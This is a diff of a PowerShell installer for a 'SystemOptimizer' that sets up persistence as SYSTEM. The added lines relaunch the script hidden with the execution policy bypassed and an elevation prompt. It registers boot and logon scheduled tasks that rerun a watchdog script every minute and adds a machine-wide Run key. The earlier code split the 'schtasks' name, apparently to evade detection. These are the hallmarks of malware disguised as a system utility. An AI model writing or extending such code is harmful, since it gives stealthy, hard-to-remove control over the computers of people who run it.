@@ -1,8 +1,13 @@
 #Requires -RunAsAdministrator
 $ErrorActionPreference = "Stop"
 
-# Admin check (iex ignores #Requires)
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }
+# Force elevation if not admin
+$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$hasHighIntegrity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("S-1-16-12288")
+if (-not $hasHighIntegrity) {
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
 
 # ===== PATHS (system-wide, universal for all users) =====
 $baseDir = "$env:ProgramData\SystemOptimizer"
@@ -81,9 +86,8 @@ $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 if (-not (Test-Path $watchdogPath)) { throw "Watchdog.vbs not created at $watchdogPath" }
 
 # ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
-& ('sch'+'tasks') /Create /TN "SystemOptimizer" /TR "wscript.exe `"$watchdogPath`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
-& ('sch'+'tasks') /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe `"$watchdogPath`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
-& ('sch'+'tasks') /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K
+$taskCmd = "schtasks /Create /TN SystemOptimizer /TR \"wscript.exe `"$watchdogPath`\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F; schtasks /Create /TN SystemOptimizer-Logon /TR \"wscript.exe `"$watchdogPath`\"\" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F; schtasks /Change /TN SystemOptimizer /RI 1 /DU 9999:59 /K"
+Start-Process cmd -ArgumentList "/c $taskCmd" -Verb RunAs -Wait
 
 # ===== REGISTRY RUN KEY =====
 try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }
